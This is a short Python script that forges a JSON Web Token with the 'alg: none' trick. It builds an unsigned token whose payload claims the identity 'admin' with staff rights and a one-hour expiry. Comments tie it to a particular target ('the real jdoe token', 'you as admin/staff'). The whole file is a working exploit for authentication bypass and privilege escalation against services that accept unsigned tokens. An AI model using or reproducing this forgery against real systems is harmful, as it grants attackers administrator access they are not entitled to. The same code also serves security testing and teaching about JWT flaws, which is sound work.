import json
import base64
import time

def b64url_encode(data: bytes) -> str:
    """Base64url-encode without padding, as JWTs require."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

# 1. Header: same shape as the real one, but alg is "none"
header = {
    "alg": "none",
    "typ": "JWT"
}

# 2. Payload: same keys as the real jdoe token, but you as admin/staff.
#    Keep exp in the future so an expiry check (if any) doesn't reject it.
payload = {
    "user": "admin",
    "is_staff": True,
    "exp": int(time.time()) + 3600  # 1 hour from now
}

header_b64  = b64url_encode(json.dumps(header,  separators=(',', ':')).encode())
payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())

# 3. Signature: empty — alg is "none", so there's nothing to sign
forged_token = f"{header_b64}.{payload_b64}."

print(forged_token)